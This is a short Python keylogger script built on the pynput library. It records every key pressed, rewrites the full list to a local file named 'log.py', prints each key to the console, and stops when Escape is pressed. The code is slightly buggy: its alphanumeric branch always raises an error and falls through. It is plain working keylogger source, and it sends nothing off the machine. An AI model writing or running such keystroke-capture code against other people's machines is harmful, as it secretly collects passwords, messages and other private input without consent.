import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print(f"alphanumeric key {keys.str} pressed")
    except AttributeError:  
        print(f"special key {keys} pressed")

def write_file(keys):
    with open("log.py", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(" ")

def on_release(key):
    print(f"{key} released")
    if key == Key.esc:
        return False
    
with Listener(on_press = on_press,
              on_release = on_release) as listener:
    listener.join()